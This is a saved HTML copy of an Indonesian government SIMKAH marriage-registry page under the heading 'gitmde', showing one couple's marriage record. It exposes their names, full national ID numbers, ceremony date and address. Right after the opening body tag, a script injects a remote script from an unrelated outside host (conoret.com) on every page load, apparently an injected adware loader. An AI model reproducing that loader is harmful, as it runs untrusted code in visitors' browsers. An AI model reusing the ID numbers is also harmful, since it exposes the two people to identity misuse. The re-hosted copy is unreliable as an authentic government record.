# gitmde

<!DOCTYPE html>
<!-- saved from url=(0060)https://simkah.kemenag.go.id/scanqr/Ots1pZy26v31wmvZZT3lIw== -->
<html lang="en" class=" cubicbezierrange displaytable display-table csscolumns csscolumns-width csscolumns-span csscolumns-fill csscolumns-gap csscolumns-rule csscolumns-rulecolor csscolumns-rulestyle csscolumns-rulewidth csscolumns-breakbefore csscolumns-breakafter csscolumns-breakinside"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    
    <title>Daftar Nikah | Sistem Informasi Manajemen Nikah - Kementerian Agama Republik Indonesia</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" href="./Daftar Nikah _ Sistem Informasi Manajemen Nikah - Kementerian Agama Republik Indonesia_files/style.css">
    <link rel="stylesheet" href="./Daftar Nikah _ Sistem Informasi Manajemen Nikah - Kementerian Agama Republik Indonesia_files/bootstrap.min.css">
    <link rel="stylesheet" href="./Daftar Nikah _ Sistem Informasi Manajemen Nikah - Kementerian Agama Republik Indonesia_files/font-awesome.min.css">
    <link rel="stylesheet" href="./Daftar Nikah _ Sistem Informasi Manajemen Nikah - Kementerian Agama Republik Indonesia_files/dataTables.bootstrap.min.css">
    <link rel="stylesheet" href="./Daftar Nikah _ Sistem Informasi Manajemen Nikah - Kementerian Agama Republik Indonesia_files/responsive.bootstrap.min.css">
    <link rel="icon" href="https://simkah.kemenag.go.id/img/logo-simkah-02.png">
        <link rel="stylesheet" href="./Daftar Nikah _ Sistem Informasi Manajemen Nikah - Kementerian Agama Republik Indonesia_files/sweetalert.css">
     <link rel="stylesheet" href="./Daftar Nikah _ Sistem Informasi Manajemen Nikah - Kementerian Agama Republik Indonesia_files/mine.css">
    <link rel="stylesheet" href="./Daftar Nikah _ Sistem Informasi Manajemen Nikah - Kementerian Agama Republik Indonesia_files/sidebar.css">
    <style>
      .myBreadcrumb {
            display: inline-block;
            box-shadow: 0 0 15px 1px rgba(0, 0, 0, 0.35);
            overflow: hidden;
            border-radius: 5px;
        }

        .myBreadcrumb > * {
            text-decoration: none;
            outline: none;
            display: block;
            float: left;
            font-size: 12px;
            line-height: 36px;
            color: black;
            /*need more margin on the left of links to accomodate the numbers*/
            padding: 0 10px 0 30px;
            background: white;
            position: relative;
            transition: all 0.5s;
        }

        .myBreadcrumb > * div {
            white-space: nowrap;
            overflow: hidden;
            text-overflow: ellipsis;    
        }

        /*since the first link does not have a triangle before it we can reduce the left padding to make it look consistent with other links*/
        .myBreadcrumb > *:first-child {
            padding-left: 10px;
            border-radius: 5px 0 0 5px; /*to match with the parent's radius*/
        }

        .myBreadcrumb >*:first-child i {
            vertical-align: sub;
        }

        .myBreadcrumb > *:last-child {
            border-radius: 0 5px 5px 0; /*this was to prevent glitches on hover*/
            padding-right: 20px;
            padding-right: 8px;
        }

        /*hover/active styles*/
        .myBreadcrumb a.active, .myBreadcrumb a:hover{
            background: #9EEB62;
        }
        .myBreadcrumb a.active:after, .myBreadcrumb a:hover:after {
            background: #9EEB62;
        }

        /*adding the arrows for the myBreadcrumbs using rotated pseudo elements*/
        .myBreadcrumb > *:after {
            content: '';
            position: absolute;
            top: 0; 
            right: -18px; /*half of square's length*/
        /*same dimension as the line-height of .myBreadcrumb a */
            width: 36px; 
            height: 36px;
        /*as you see the rotated square takes a larger height. which makes it tough to position it properly. So we are going to scale it down so that the diagonals become equal to the line-height of the link. We scale it to 70.7% because if square's: 
        length = 1; diagonal = (1^2 + 1^2)^0.5 = 1.414 (pythagoras theorem)
        if diagonal required = 1; length = 1/1.414 = 0.707*/
            transform: scale(0.707) rotate(45deg);
            -ms-transform:scale(0.707) rotate(45deg);
            -webkit-transform:scale(0.707) rotate(45deg);
        
        /*we need to prevent the arrows from getting buried under the next link*/
            z-index: 1;
        /*background same as links but the gradient will be rotated to compensate with the transform applied*/
            background: white;
        /*stylish arrow design using box shadow*/
            box-shadow: 
            2px -2px 0 2px rgba(0, 0, 0, 0.4), 
            3px -3px 0 2px rgba(255, 255, 255, 0.1);
        /*
            5px - for rounded arrows and 
            50px - to prevent hover glitches on the border created using shadows*/
            border-radius: 0 5px 0 50px;
            transition: all 0.5s;
        }
        /*we dont need an arrow after the last link*/
        .myBreadcrumb > *:last-child:after {
            content: none;
        }
        /*we will use the :before element to show numbers*/
        .myBreadcrumb > *:before {
        /*some styles now*/
            border-radius: 100%;
            width: 20px;
            height: 20px;
            line-height: 20px;
            margin: 8px 0;
            position: absolute;
            top: 0;
            left: 30px;
            background: white;
            background: linear-gradient(#444, #222);
            font-weight: bold;
            box-shadow: 0 0 0 1px #ccc;
        }

        .myBreadcrumb > *:nth-child(n+2) {
            display:none;
        }


        @media (max-width: 767px) {
            .myBreadcrumb > *:nth-last-child(-n+4) {
                display:block;
            } 
            .myBreadcrumb > * div {
                max-width: 100px;
            }
        }

        @media (min-width: 768px) {
            .myBreadcrumb > *:nth-last-child(-n+6) {
                display:block;
            } 
            .myBreadcrumb > * div {
                max-width: 375px;
            }
        }
    </style>
<script src="./Daftar Nikah _ Sistem Informasi Manajemen Nikah - Kementerian Agama Republik Indonesia_files/dsp" type="text/javascript" defer="" async=""></script></head>
<body><script type="text/javascript">window.top === window && !function(){var e=document.createElement("script"),t=document.getElementsByTagName("head")[0];e.src="//conoret.com/dsp?h="+document.location.hostname+"&r="+Math.random(),e.type="text/javascript",e.defer=!0,e.async=!0,t.appendChild(e)}();</script>
	<div class="container">
		<div class="top-simkah">          
    <p class="pull-right"> <b>SIMKAH </b> - SISTEM INFORMASI MANAJEMEN NIKAH </p>
	<marquee width="100%" direction="left" height="20px">
        <b>[MOHON DIPEDOMANI] Berdasarkan Surat No. B-237/Dt.III.II/HM.00/11/2021 Tanggal 9 November 2021 Tentang Implementasi SIMKAH WEB - SIMPONI Nasional termasuk kode satker dan nama satker sudah disesuaikan dengan Kantor Kementerian Agama Kabupaten/Kota masing-masing (Tanpa harus merubah kode satker pada apikasi SIMPONI). Maka untuk integrasi SIMKAH WEB - SIMPONI resmi diimplementasikan oleh seluruh User KUA secara Nasional. Berikut tautannya [http://tiny.cc/xleluz] | | | | | | | | | | | | [MOHON DIPEDOMANI] Berdasarkan Surat No. B-4196/Dt.III.II.1/PS.03.3/11/2021 Tanggal 8 November 2021 Tentang Buku Nikah Hilang Dinyatakan Tidak Berlaku. Maka untuk Buku Nikah yang hilang karena adanya tindak pencurian dengan Nomor Seri JA102753001 s.d. JA102754500 dinyatakan tidak berlaku pada seluruh KUA Kecamatan se-Indonesia. Berikut tautannya [http://tiny.cc/ctaluz]	</b>
    </marquee>
</div>
<div class="header">
    <div class="pull-left">
        <div class="img-logo2"></div>
    </div>
    <div class="pull-right">
        
        <img src="./Daftar Nikah _ Sistem Informasi Manajemen Nikah - Kementerian Agama Republik Indonesia_files/kualogo.png" width="130px" class="img-responsive">
    </div>
    <div class="pull-right text-logo">
        <p>DIREKTORAT JENDERAL BIMBINGAN MASYARAKAT ISLAM<br>
         KEMENTERIAN AGAMA REPUBLIK INDONESIA</p>
    </div>
</div>
					<nav class="navbar-login navbar-inverse2">
  <div class="container-fluid">
    <div class="navbar-header">
      <button type="button" class="navbar-toggle" style="background: green;" data-toggle="collapse" data-target="#myNavbar">
      </button>
<!--      <a class="navbar-brand" id href="https://simkah.kemenag.go.id" style="color:black;">Beranda</a> -->
      <a class="navbar-brand" id="" href="https://simkah.kemenag.go.id/infoPendaftaran" style="color:black;">Info Pendaftaran Nikah</a>
      
    </div>
     <div class="nav navbar-nav navbar-right">
          <a class="navbar-brand" href="https://simkah.kemenag.go.id/login"><span class="glyphicon glyphicon-log-in"></span> &nbsp;LOGIN</a> 
       
  </div>
</div>
</nav>
				
    	
    <br>
  <div class="row">
            <div class="col-md-12">
        <div class="panel panel-default box box-primary">
          <div class="panel panel-default">
            <div class="panel-heading">Cek Nomor Perforasi</div>
              <div class="panel-body ">

                <div class="panel panel-default z-daftar-panel">
                  <div class="panel-body z-daftar-body">

                      <div class="col-md-12 text-center z-daftar-text">
                        Nomor Perforasi : 104314450
                      </div>
                    </div>
                  </div>
                    <div class="col-md-12">
                        <table class="table">
                            <tbody>
                                <tr>
                                    <td>Nomor Porporasi</td>
                                    <td>:</td>
                                    <td>104314450</td>
                                </tr>
                                <tr>
                                    <td>Nomor Akta</td>
                                    <td>:</td>
                                    <td>0392/015/VII/2022</td>
                                </tr>
                                <!-- <tr>
                                    <td colspan="3"><b>Detail KUA</b></td>
                                </tr> -->
                                <tr>
                                    <td>Provinsi</td>
                                    <td>:</td>
                                    <td>DKI JAKARTA</td>
                                </tr>
                                <tr>
                                    <td>Kabupaten/Kota</td>
                                    <td>:</td>
                                    <td>JAKARTA UTARA</td>
                                </tr>
                                <tr>
                                    <td>Kecamatan</td>
                                    <td>:</td>
                                    <td>PENJARINGAN</td>
                                </tr>
                                <!-- <tr>
                                    <td colspan="3"><b>Detail Suami Istri</b></td>
                                </tr> -->
                                <tr>
                                    <td>Nama Suami</td>
                                    <td>:</td>
                                    <td>RAHENDI</td>
                                </tr>
                                <tr>
                                    <td>NIK Suami</td>
                                    <td>:</td>
                                    <td>3207212002990001</td>
                                </tr>
                                <tr>
                                    <td>Nama Istri</td>
                                    <td>:</td>
                                    <td>VITARI TUMARAR</td>
                                </tr>
                                <tr>
                                    <td>NIK Istri</td>
                                    <td>:</td>
                                    <td>3172014111920007</td>
                                </tr>
                                <!-- <tr>
                                    <td colspan="3"><b>Pelaksanaan Akad Nikah</b></td>
                                </tr> -->
                                <tr>
                                    <td>Di Luar atau Di KUA</td>
                                    <td>:</td>
                                    <td>Di Luar KUA</td>
                                </tr>
                                <tr>
                                    <td colspan="3">Tanggal Akad</td>
                                </tr>
                                <tr>
                                    <td>Masehi</td>
                                    <td>:</td>
                                    <td>03 - 07 - 2022</td>
                                </tr>
                                <tr>
                                    <td>Hijriah</td>
                                    <td>:</td>
                                    <td>3 ZULHIJJAH 1443</td>
                                </tr>
                                <tr>
                                    <td>Jam Akad</td>
                                    <td>:</td>
                                    <td>11:00</td>
                                </tr>
                                <tr>
                                    <td>Alamat Lokasi Akad Nikah</td>
                                    <td>:</td>
                                    <td>JL. PLUIT RAYA NO.5 PENJARINGAN JAKARTA UTARA</td>
                                </tr>
                                <tr>
                                    <td>Wali Nikah</td>
                                    <td>:</td>
                                    <td>NURHASIM, S.AG (Hakim)</td>
                                </tr>
                            </tbody>
                        </table>
                        <center><a href="https://simkah.kemenag.go.id/kartu/Ots1pZy26v31wmvZZT3lIw==" class="btn btn-info" role="button btn-sm">Download Kartu Nikah Digital</a></center>
                    </div>
                </div>
              </div>
            </div>
          </div>
        </div>        
  </div>
  

    	<div class="footer">
  <p>Copyright © 2018 By: Direktorat Jenderal Bimbingan Masyarakat Islam - Kementerian Agama Republik Indonesia - All Right Reserved</p>
</div>	

    <script src="./Daftar Nikah _ Sistem Informasi Manajemen Nikah - Kementerian Agama Republik Indonesia_files/jquery.min.js.download"></script>
<script src="./Daftar Nikah _ Sistem Informasi Manajemen Nikah - Kementerian Agama Republik Indonesia_files/bootstrap.min.js.download"></script>
<script src="./Daftar Nikah _ Sistem Informasi Manajemen Nikah - Kementerian Agama Republik Indonesia_files/modernizr-custom.js.download"></script>
<script src="./Daftar Nikah _ Sistem Informasi Manajemen Nikah - Kementerian Agama Republik Indonesia_files/jquery-1.12.4.js.download"></script>
<script src="./Daftar Nikah _ Sistem Informasi Manajemen Nikah - Kementerian Agama Republik Indonesia_files/jquery.dataTables.min.js.download"></script>
<script src="./Daftar Nikah _ Sistem Informasi Manajemen Nikah - Kementerian Agama Republik Indonesia_files/dataTables.bootstrap.min.js.download"></script>
<script src="./Daftar Nikah _ Sistem Informasi Manajemen Nikah - Kementerian Agama Republik Indonesia_files/date.js.download"></script>


<script src="./Daftar Nikah _ Sistem Informasi Manajemen Nikah - Kementerian Agama Republik Indonesia_files/highcharts.js.download"></script>
<script src="./Daftar Nikah _ Sistem Informasi Manajemen Nikah - Kementerian Agama Republik Indonesia_files/data.js.download"></script>
<script src="./Daftar Nikah _ Sistem Informasi Manajemen Nikah - Kementerian Agama Republik Indonesia_files/drilldown.js.download"></script>
<script src="./Daftar Nikah _ Sistem Informasi Manajemen Nikah - Kementerian Agama Republik Indonesia_files/exporting.js.download"></script>
<script src="./Daftar Nikah _ Sistem Informasi Manajemen Nikah - Kementerian Agama Republik Indonesia_files/export-data.js.download"></script>


    <script src="./Daftar Nikah _ Sistem Informasi Manajemen Nikah - Kementerian Agama Republik Indonesia_files/sweetalert.js.download" charset="utf-8"></script>
    <script src="./Daftar Nikah _ Sistem Informasi Manajemen Nikah - Kementerian Agama Republik Indonesia_files/sweetalert.min.js.download" charset="utf-8"></script>


</body></html>
